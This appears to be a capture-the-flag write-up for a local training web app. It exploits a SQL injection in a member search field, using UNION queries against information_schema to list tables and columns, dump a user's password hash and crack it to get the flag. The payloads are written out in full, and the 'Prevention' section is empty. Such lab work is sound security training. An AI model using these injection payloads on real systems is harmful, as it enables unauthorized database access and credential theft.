```
browsing to the Member page : http://localhost:8080/?page=member

we have a field where we can search members using an id (integer)

and the data is getting fetched from the database trying a random input we get prompted with syntax error returned from the SQL database which is mariadb lets try a straighforward input 

1 or 1 = 1 

we get all the entries returned to us so basicly the input field is vulnerable to SQL injection .  lets try UNION statement to make queries to the database and use the error returned from the database to guid us to some valuable data .

Querying the metadata on a data source is the easiest way to determine the makeup of a table if you don’t have an understanding of it already.

so i used information.schema to query the database trying to get information about all the tables then number of rows in each table


--> 1 or 1 = 1 UNION SELECT t.TABLE_NAME, t.TABLE_ROWS FROM information_schema.TABLES AS t

TABLE_SCHEMA  -- TABLE_NAME  --  TABLE_ROWS
                    users           4
                    guestbook       1
                    list_images     5
                    vote_dbs        5
                    db_default      2


--> 1 or 1 = 1 UNION SELECT t.TABLE_NAME, t.COLUMN_NAME FROM information_schema.COLUMNS AS t 

guestbook : id_comment -- comment -- name .

list_images : id -- url -- title -- comment .

vote_dbs : vote -- nb_vote -- subject .

db_default : id -- username -- password .

users :  user_id  -- first_name -- last_name -- town -- country -- planet -- Commentaire -- 
countersign.


--> 1 or 1 = 1 UNION SELECT t.last_name, t.countersign FROM users AS t

ID: 1 or 1 = 1 UNION SELECT t.last_name, t.countersign FROM users AS t 
First name: GetThe
Surname : 5ff9d0165b4f92b14994e5c685cdce28







--> 1 or 1 = 1 UNION SELECT t.last_name, t.Commentaire FROM users AS t 

ID: 1 or 1 = 1 UNION SELECT t.last_name, t.Commentaire FROM users AS t 
First name: GetThe
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !

user_id : 5
first_name : Flag
last_name : GetThe
town : 42
country : 42
planet : 42
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28

5ff9d0165b4f92b14994e5c685cdce28 => md5 => FortyTwo => fortytwo => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```


***Prevention***
```
```